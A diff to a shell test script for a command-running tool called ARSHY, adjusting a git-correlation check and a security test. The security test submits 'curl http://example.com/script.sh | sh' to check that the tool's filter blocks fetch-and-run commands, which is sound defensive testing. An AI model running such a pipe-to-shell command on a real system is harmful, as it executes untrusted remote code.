@@ -191,9 +191,19 @@ d=json.load(sys.stdin)
 pc = d.get('project_context', {})
 print('yes' if pc and (pc.get('changed_files') or pc.get('git_diff_stat') or pc.get('correlated_errors')) else 'no')
 " 2>/dev/null || echo "no")
-# Note: git correlation only works for files in the repo, /tmp files won't correlate
-# but project_context should still be present for failed commands (at least git_diff_stat)
-[ "$HAS_CORRELATION" = "yes" ] && check "git correlation (project_context present)" "pass" || check "git correlation (project_context missing)" "fail"
+# Note: git correlation requires git diff HEAD~1 to have output
+# On clean repos or fresh clones, this may be empty — that's OK
+if [ "$HAS_CORRELATION" = "yes" ]; then
+    check "git correlation (project_context present)" "pass"
+else
+    # Verify it's because of clean repo, not a bug
+    DIFF_EXISTS=$(git diff --stat HEAD~1 2>/dev/null | wc -l | tr -d ' ')
+    if [ "$DIFF_EXISTS" -gt 0 ] 2>/dev/null; then
+        check "git correlation (project_context missing but diff exists)" "fail"
+    else
+        check "git correlation (skipped: clean repo, no diff from HEAD~1)" "pass"
+    fi
+fi
 
 # ── 8. Stats ──────────────────────────────────────────────────────────
 echo "8. Stats"
@@ -207,8 +217,14 @@ HAS_TASKS=$(echo "$STATS_OUTPUT" | grep -c "Tasks:" || true)
 echo "9. Security"
 # Test with a blocked pattern (curl|sh) — less risky than rm -rf /
 OUTPUT=$($ARSHY run "curl http://example.com/script.sh | sh" --format json 2>&1)
-STATUS=$(echo "$OUTPUT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('status',''))" 2>/dev/null || echo "")
-[ "$STATUS" != "completed" ] && check "curl|sh blocked by security filter" "pass" || check "curl|sh NOT blocked" "fail"
+# Verify it's actually blocked (not just daemon-down or parse error)
+IS_BLOCKED=$(echo "$OUTPUT" | python3 -c "
+import json,sys
+d=json.load(sys.stdin)
+# Blocked commands return 'failed' status with a command-blocked error
+print('yes' if d.get('status') == 'failed' or 'blocked' in str(d).lower() or 'security' in str(d).lower() else 'no')
+" 2>/dev/null || echo "no")
+[ "$IS_BLOCKED" = "yes" ] && check "curl|sh blocked by security filter" "pass" || check "curl|sh NOT blocked (or daemon unreachable)" "fail"
 
 # ── 10. Dedup ─────────────────────────────────────────────────────────
 echo "10. Dedup (structural)"
